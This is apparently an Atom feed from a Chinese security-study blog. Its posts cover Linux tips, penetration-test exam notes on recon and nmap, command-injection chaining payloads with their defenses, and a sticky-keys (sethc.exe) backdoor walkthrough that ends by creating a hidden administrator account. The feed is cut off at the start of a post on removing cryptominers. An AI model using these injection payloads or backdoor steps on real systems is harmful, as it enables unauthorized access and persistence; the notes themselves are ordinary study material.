<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>故园遗剑</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-07-27T02:46:31.793Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>mys3t</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>日常问题解决</title>
    <link href="http://yoursite.com/2020/07/16/%E6%97%A5%E5%B8%B8%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    <id>http://yoursite.com/2020/07/16/日常问题解决/</id>
    <published>2020-07-16T08:12:25.000Z</published>
    <updated>2020-07-27T02:46:31.793Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="日常小知识"><a href="#日常小知识" class="headerlink" title="日常小知识"></a>日常小知识</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h4 id="校验MD5"><a href="#校验MD5" class="headerlink" title="校验MD5"></a>校验MD5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertUtil -hashfile D:\XXX\XX\XXXXXXX.iso MD5</span><br></pre></td></tr></table></figure><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h4 id="kali设置中文"><a href="#kali设置中文" class="headerlink" title="kali设置中文"></a>kali设置中文</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install locales</span><br><span class="line">apt install ttf-wqy-zenhei</span><br><span class="line">apt install xfonts-intl-chinese</span><br><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>选中下面三个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">en_US.UTF-8</span><br><span class="line">zh_CN.UTF-8</span><br><span class="line">zh_CN.GBK</span><br></pre></td></tr></table></figure><p>接着选择字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zh_CN.UTF-8</span><br></pre></td></tr></table></figure><p>然后reboot</p><h4 id="kali使用全局代理"><a href="#kali使用全局代理" class="headerlink" title="kali使用全局代理"></a>kali使用全局代理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br></pre></td></tr></table></figure><p><img src="/2020/07/16/%E6%97%A5%E5%B8%B8%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/image-20200727104600146.png" alt="image-20200727104600146"></p><p>在需要代理的命令前加上 proxychains</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl https:&#x2F;&#x2F;www.xx.xxx.xx</span><br></pre></td></tr></table></figure><h4 id="Ubuntu普通用户改root用户"><a href="#Ubuntu普通用户改root用户" class="headerlink" title="Ubuntu普通用户改root用户"></a>Ubuntu普通用户改root用户</h4><p>首先安装编辑器gedit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gedit</span><br></pre></td></tr></table></figure><p>然后编辑/etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>将想要修改的用户的ID，一般为<code>1000:1000</code>,改为root用户ID<code>0:0</code></p><p>保存退出，重启即可。</p><h4 id="Ubuntu安装vmware-tool"><a href="#Ubuntu安装vmware-tool" class="headerlink" title="Ubuntu安装vmware tool"></a>Ubuntu安装vmware tool</h4><p>虚拟机点击安装vmware tool，在桌面上会自动出现CD标志，进入进入其中，会发现无法对VM***.tar.gz进行操作，显示只读。</p><p>解决方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.拖动VM***.tar.gz至桌面，tar zxvf VM***.tar.gz即可</span><br><span class="line">2.进入解压后的文件夹，执行</span><br><span class="line">chmod +x vmware-install.pl</span><br><span class="line">sudo .&#x2F;vmware-install.pl</span><br><span class="line">3.选择yes，一路回车，提示yes输入yes即可，最后reboot</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="问题解决" scheme="http://yoursite.com/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="日常踩坑" scheme="http://yoursite.com/tags/%E6%97%A5%E5%B8%B8%E8%B8%A9%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>PTE理论1</title>
    <link href="http://yoursite.com/2020/07/16/PTE%E7%90%86%E8%AE%BA1/"/>
    <id>http://yoursite.com/2020/07/16/PTE理论1/</id>
    <published>2020-07-16T00:55:34.000Z</published>
    <updated>2020-07-16T03:12:28.156Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="PTE理论1"><a href="#PTE理论1" class="headerlink" title="PTE理论1"></a>PTE理论1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h4 id="信息收集概述"><a href="#信息收集概述" class="headerlink" title="信息收集概述"></a>信息收集概述</h4><p>黑客在攻击前、过程中对目标所进行的探测活动。</p><p>信息收集的作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">缩小攻击范围</span><br><span class="line">了解架构安全</span><br><span class="line">建立信息数据库</span><br><span class="line">描绘网络拓扑</span><br></pre></td></tr></table></figure><p>信息收集分类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主动信息收集</span><br><span class="line">被动信息收集</span><br></pre></td></tr></table></figure><p>信息收集内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网络信息：域名、控制策略、开放端口、协议、防火墙、认证机制、VPN接入点、IP地址、网段</span><br><span class="line">系统信息：系统banner、目录、临时文件、路由表、系统架构</span><br><span class="line">组织信息：组织背景、员工信息、邮箱&#x2F;电话、地址、官网</span><br></pre></td></tr></table></figure><p>主动信息收集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">netbios枚举</span><br><span class="line">SNMP枚举</span><br><span class="line">Linux枚举</span><br><span class="line">LDAP枚举</span><br><span class="line">ntp枚举</span><br><span class="line">smtp枚举</span><br><span class="line">DNS枚举</span><br></pre></td></tr></table></figure><h4 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">域名信息</span><br><span class="line">所有者联系方式</span><br><span class="line">域名服务器</span><br><span class="line">网站IP范围</span><br><span class="line">域名创建时间</span><br><span class="line">过期记录</span><br><span class="line">最近更新记录</span><br></pre></td></tr></table></figure><p>DNS资源记录类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A记录</span><br><span class="line">CNAME</span><br><span class="line">NS</span><br><span class="line">PTR</span><br><span class="line">MX</span><br></pre></td></tr></table></figure><p>DNS查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali自带nslookup</span><br><span class="line">dig</span><br></pre></td></tr></table></figure><p>确定地址范围作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">协助绘制目标网络拓扑图</span><br><span class="line">使用ARIN whois database search 工具找到IP地址范围</span><br><span class="line">通过区域因特网注册机构找到IP地址范围和目标子网掩码</span><br></pre></td></tr></table></figure><h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h4><p>用途</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">端口探测</span><br><span class="line">主机探测</span><br><span class="line">系统探测</span><br><span class="line">版本探测</span><br></pre></td></tr></table></figure><p>常用参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-v 详细</span><br><span class="line">-p 指定端口范围</span><br><span class="line">-O 操作系统识别</span><br><span class="line">-A 全面检测</span><br><span class="line">-sV 探测端口-服务器版本</span><br><span class="line">-sA ACK扫描-探测防火墙</span><br><span class="line">-sP ping扫描-快速扫描</span><br><span class="line">-sS TCP SYN半开放扫描-隐蔽扫描</span><br><span class="line">-sT 全连接扫描-防火墙会留日志</span><br><span class="line">-sU UDP扫描-确定端口开放</span><br></pre></td></tr></table></figure><p>常用扫描参数示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">半开放扫描全端口：nmap -sS -p 1-65535 -v ip&#x2F;url</span><br><span class="line"></span><br><span class="line">扫描C段存活主机：nmap -sP ip&#x2F;url</span><br><span class="line"></span><br><span class="line">指定端口扫描：nmap -p 80 ip&#x2F;url</span><br><span class="line"></span><br><span class="line">扫描主机操作系统：nmap -O ip&#x2F;url</span><br><span class="line"></span><br><span class="line">主机详细扫描：nmap -A -v IP&#x2F;url</span><br><span class="line"></span><br><span class="line">穿透防火墙扫描：</span><br><span class="line">nmap -Pn -A ip&#x2F;url</span><br><span class="line">nmap -sS -T4 ip&#x2F;url</span><br><span class="line">nmap -sF -T4 ip&#x2F;url</span><br><span class="line">nmap -sA -T4 ip&#x2F;url</span><br></pre></td></tr></table></figure><h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p>大部分应用组件存在说明当前服务名称和版本的特征，识别这些特征即可获取当前服务信息。</p><p>web架构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">大多数web组件可以粗略的分为三个组件：</span><br><span class="line">客户端</span><br><span class="line">服务端</span><br><span class="line">后端存储，一般是DBMS，用于查询和存储数据</span><br></pre></td></tr></table></figure><p>客户端技术</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端技术包括html、falsh、javascript。。。</span><br></pre></td></tr></table></figure><p>服务端技术</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web服务器：Apache、Nginx、IIS、linghttpd。。。</span><br><span class="line">应用服务器：tomcat、jboss、Oracle。。。。</span><br><span class="line">编程语言：PHP、java、ruby、Python、C#</span><br></pre></td></tr></table></figure><p>后端存储技术</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">中小型网站，一般数据库和web服务器在同一台服务器上。</span><br><span class="line">关系型数据库：Mysql、Oracle、DB2、SQL Server、Postgresql、Sqlite。。。</span><br><span class="line">NOSQL：MongoDB、CouchDB、Redis。。。</span><br><span class="line"></span><br><span class="line">目录访问：openLDAP、Active Directory</span><br></pre></td></tr></table></figure><p>常见的web应用指纹识别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">特殊文件的MD5值匹配</span><br><span class="line">请求响应主体内容或头信息的关键字匹配</span><br><span class="line">请求响应主体内容或头信息的正则匹配</span><br><span class="line">基于url关键字识别</span><br><span class="line">基于TCP&#x2F;IP请求协议识别服务指纹</span><br></pre></td></tr></table></figure><p>手工检测恶意指纹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP分析：</span><br><span class="line">1.观察响应头的server、X-forward-by、cookie字段</span><br><span class="line">2.使用畸形的host字段的HTTP请求试探，观察响应头</span><br><span class="line"></span><br><span class="line">网站的HTML源码</span><br></pre></td></tr></table></figure><p>根据网站页面后缀判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">存在.php结尾的文件说明该web应用是用PHP写的；</span><br><span class="line">存在.jsp或.do的文件，说明该web应用是用java写的；</span><br><span class="line">存在.asp或.aspx结尾的文件，说明该web应用可能是由vb或C#写的</span><br></pre></td></tr></table></figure><p>浏览网站favicon.ico</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以通过默认favicon.ico来判断CMS</span><br></pre></td></tr></table></figure><p>robots.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有些cms会有默认的robots.txt，可以通过robots.txt来判断CMS</span><br></pre></td></tr></table></figure><p>刻意构造错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误页面可以提供关于服务器的大量信息，可以构造错误来尝试得到404界面。</span><br></pre></td></tr></table></figure><p><img src="/2020/07/16/PTE%E7%90%86%E8%AE%BA1/image-20200716103839018.png" alt="image-20200716103839018"></p><p>自动化指纹分析工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">whatweb</span><br><span class="line">wappalyzer</span><br><span class="line">天蝎指纹库</span><br><span class="line">plecost</span><br><span class="line">website analyzer</span><br><span class="line">cms-explorer</span><br><span class="line">shodan&#x2F;fofa&#x2F;zoomeye&#x2F;傻蛋</span><br></pre></td></tr></table></figure><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">窃听</span><br><span class="line">肩窥</span><br><span class="line">垃圾搜寻</span><br><span class="line">社交模仿</span><br></pre></td></tr></table></figure><p>社交网络SNS</p><p><img src="/2020/07/16/PTE%E7%90%86%E8%AE%BA1/image-20200716111209068.png" alt="image-20200716111209068"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="PTE" scheme="http://yoursite.com/categories/PTE/"/>
    
    
      <category term="PTE" scheme="http://yoursite.com/tags/PTE/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统加固</title>
    <link href="http://yoursite.com/2020/07/10/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/"/>
    <id>http://yoursite.com/2020/07/10/Linux系统加固/</id>
    <published>2020-07-10T07:32:20.000Z</published>
    <updated>2020-07-10T07:34:07.844Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="Linux系统加固"><a href="#Linux系统加固" class="headerlink" title="Linux系统加固"></a>Linux系统加固</h1>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Linux系统安全" scheme="http://yoursite.com/categories/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Linux加固" scheme="http://yoursite.com/tags/Linux%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="http://yoursite.com/2020/07/10/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/07/10/命令执行漏洞/</id>
    <published>2020-07-10T06:48:37.000Z</published>
    <updated>2020-07-10T06:56:23.781Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="什么是命令执行"><a href="#什么是命令执行" class="headerlink" title="什么是命令执行"></a>什么是命令执行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.原理</span><br><span class="line">Web应用程序接收用户输入，拼接到要执行的系统命令中执行。</span><br><span class="line">产生原因：</span><br><span class="line">用户输入未过滤或净化</span><br><span class="line">拼接到系统命令中执行</span><br><span class="line"></span><br><span class="line">2.PHP下的命令执行函数</span><br><span class="line">system</span><br><span class="line">exec</span><br><span class="line">shell_exec</span><br><span class="line">passthru</span><br><span class="line">popen</span><br><span class="line">proc_popen</span><br><span class="line"></span><br><span class="line">payload示例：</span><br><span class="line">xxx.xxx.com&#x2F;?cmd&#x3D;ipconfig</span><br></pre></td></tr></table></figure><h2 id="windows下命令执行"><a href="#windows下命令执行" class="headerlink" title="windows下命令执行"></a>windows下命令执行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.利用思路</span><br><span class="line">当代码中拼接用户的输入并带入system函数执行，但无法直接执行用户的自定义命令。</span><br><span class="line">思路：</span><br><span class="line">截断输入，重新拼接，两条命令都输入并执行。</span><br><span class="line"></span><br><span class="line">2.命令执行漏洞拼接符</span><br><span class="line">在windows系统下的cmd命令，有以下截断拼接符：</span><br><span class="line">&amp;前面的语句为假则直接执行后面的</span><br><span class="line">&amp;&amp;前面的语句为假则直接出错，后面的也不执行</span><br><span class="line">|直接执行后面的语句</span><br><span class="line">||前面出错执行后面的</span><br><span class="line"></span><br><span class="line">正常情况下ping 127.0.0.1</span><br><span class="line">ping 111 &amp; ipconfig</span><br><span class="line">ping 127.0.0.1 &amp;&amp; ipconfig</span><br><span class="line">ping 127.0.0.1 | ipconfig</span><br><span class="line">ping 111 || ipconfig</span><br></pre></td></tr></table></figure><h2 id="Linux下命令执行"><a href="#Linux下命令执行" class="headerlink" title="Linux下命令执行"></a>Linux下命令执行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.命令执行漏洞拼接符</span><br><span class="line">在Linux系统下的shell命令中，有以下一些截断拼接符：</span><br><span class="line">;执行完前面的执行后面的</span><br><span class="line">|管道符，显示后面的执行结果</span><br><span class="line">||当前面的执行出错时执行后面的</span><br><span class="line">&amp;无论前边语句真假都会执行</span><br><span class="line">&amp;&amp;只有前面语句为真，才会执行后边语句</span><br></pre></td></tr></table></figure><h2 id="命令执行自动化测试工具"><a href="#命令执行自动化测试工具" class="headerlink" title="命令执行自动化测试工具"></a>命令执行自动化测试工具</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.COmmix</span><br><span class="line">commix是一个使用Python开发的漏洞测试工具，用于测试一个请求是否存在命令执行漏洞，可直接导入burp的历史记录进行检测。</span><br><span class="line">项目地址：https:&#x2F;&#x2F;github.com&#x2F;stasinopoulos&#x2F;commix</span><br><span class="line">在kali中自带了commix工具</span><br><span class="line"></span><br><span class="line">2.commix工具基本使用</span><br><span class="line">commix -u xxx.xxx.com&#x2F;test.php?cmd&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">避免或少用执行命令的函数或者直接禁用；</span><br><span class="line">进入执行命令的函数&#x2F;方法之前，对参数进行过滤，对敏感字符进行转义；</span><br><span class="line">disable_functions中禁用执行命令的函数；</span><br><span class="line">对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤；</span><br><span class="line">对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤；</span><br><span class="line">参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/articles/network/154670.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/154670.html</a></p><p>命令执行漏洞综合分析：</p><p><a href="http://www.hetianlab.com/cour.do?w=1&amp;c=C9d6c0ca797abec2016071516463300001" target="_blank" rel="noopener">http://www.hetianlab.com/cour.do?w=1&amp;c=C9d6c0ca797abec2016071516463300001</a></p><p>ImageMagick命令执行漏洞：</p><p><a href="http://www.hetianlab.com/expc.do?ce=8700261e-dbcd-4a3a-aad4-1ad74de4a091" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=8700261e-dbcd-4a3a-aad4-1ad74de4a091</a></p><p>Struts2(s2-045)远程命令执行：</p><p><a href="http://www.hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2017031012041000001" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2017031012041000001</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="命令执行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>win2003-shift后门</title>
    <link href="http://yoursite.com/2020/07/10/win2003-shift%E5%90%8E%E9%97%A8/"/>
    <id>http://yoursite.com/2020/07/10/win2003-shift后门/</id>
    <published>2020-07-10T05:27:52.000Z</published>
    <updated>2020-07-10T05:48:41.373Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="Win2003-shift后门"><a href="#Win2003-shift后门" class="headerlink" title="Win2003 shift后门"></a>Win2003 shift后门</h1><h2 id="shift键"><a href="#shift键" class="headerlink" title="shift键"></a>shift键</h2><p> Windows中的粘滞键是专为同时按下两个或多个键有困难的人设计的。粘滞键的主要功能是方便Shift、Ctrl、Alt与其他键的组合使用。在我们使用热键时，例如“CTRL+C”，用粘滞键就可以一次只按一个键来完成复制的功能。</p><p><img src="/2020/07/10/win2003-shift%E5%90%8E%E9%97%A8/image-20200710133156606.png" alt="image-20200710133156606"></p><p>启动粘滞键可通过单击“开始→设置→控制面板→辅助功能选项”，在“键盘”选项卡下选中“使用粘滞键”来启动。在开启粘滞键的时候，任务栏右边的系统托盘区会出现粘滞键图标。如果想关闭粘滞键，只需将“使用粘滞键”前的钩消除就可以。</p><h2 id="系统后门"><a href="#系统后门" class="headerlink" title="系统后门"></a>系统后门</h2><p> 后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。  后门是一种登录系统的方法，它不仅绕过系统已有的安全设置，而且还能挫败系统上各种增强的安全设置。</p><p>后门程序又称特洛依木马，其用途在于潜伏在电脑中，从事搜集信息或便于黑客进入的动作。后门程序和电脑病毒最大的差别，在于后门程序不一定有自我复制的动作，也就是后门程序不一定会“感染”其它电脑。</p><p>系统级的后门才是最好的后门，因为他不易被发现，利用系统的漏洞来利用，通过将原系统文件替换，一般不去检查对应文件大小或者原文件位置比对的话，很难被发现。</p><h2 id="shift后门制作"><a href="#shift后门制作" class="headerlink" title="shift后门制作"></a>shift后门制作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">点击开始 -&gt; 运行，在运行的对话框中输入cmd回车</span><br><span class="line">切换至system32目录：cd c:\windows\system32</span><br></pre></td></tr></table></figure><p>备份sethc.exe </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move sethc.exe sethc.exe.bak</span><br></pre></td></tr></table></figure><p>将cmd.exe改成为sethc.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure><h2 id="登录shift后门"><a href="#登录shift后门" class="headerlink" title="登录shift后门"></a>登录shift后门</h2><p>点击开始 -&gt; 运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入mstsc，打开远程桌面，进入登录界面后</span><br><span class="line">连续按5次shift键，激活后门程序</span><br></pre></td></tr></table></figure><p>输入net user查看当前账户信息</p><p><img src="/2020/07/10/win2003-shift%E5%90%8E%E9%97%A8/image-20200710134415502.png" alt="image-20200710134415502"></p><p>新建用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test 123456 &#x2F;add</span><br></pre></td></tr></table></figure><p>将新加用户添加至administrators组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators test &#x2F;add</span><br></pre></td></tr></table></figure><p>激活账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test &#x2F;active:yes</span><br></pre></td></tr></table></figure><p>输入新加账户和密码进入目标主机</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Windows系统安全" scheme="http://yoursite.com/categories/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="win2003" scheme="http://yoursite.com/tags/win2003/"/>
    
  </entry>
  
  <entry>
    <title>恶意挖矿清除常规步骤</title>
    <link href="http://yoursite.com/2020/07/10/%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E6%B8%85%E9%99%A4%E5%B8%B8%E8%A7%84%E6%AD%A5%E9%AA%A4/"/>
    <id>http://yoursite.com/2020/07/10/恶意挖矿清除常规步骤/</id>
    <published>2020-07-10T05:11:54.000Z</published>
    <updated>2020-07-10T05:21:27.550Z</updated>
    
